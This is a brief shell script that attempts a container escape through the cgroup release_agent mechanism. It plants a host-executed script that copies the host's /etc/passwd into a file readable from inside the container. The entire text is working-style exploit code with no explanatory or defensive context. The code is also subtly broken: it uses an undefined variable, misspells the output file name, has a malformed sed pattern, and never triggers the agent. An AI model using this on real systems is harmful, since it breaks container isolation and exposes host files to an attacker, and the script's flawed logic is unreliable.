#!/bin/sh
rdmad=`dirname $(ls -x /s*/fs/c*/* |head -n1)`
mkdir -p $rdmad/w;echo 1 >$d/w/notify_on_release
fspath=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
> /out_container
echo $fspath/cmd >$rdmad/release_agent;printf '#!/bin/sh\ncat /etc/passwd >'"$fspath/out_conatiner" >/cmd
chmod +x /cmd
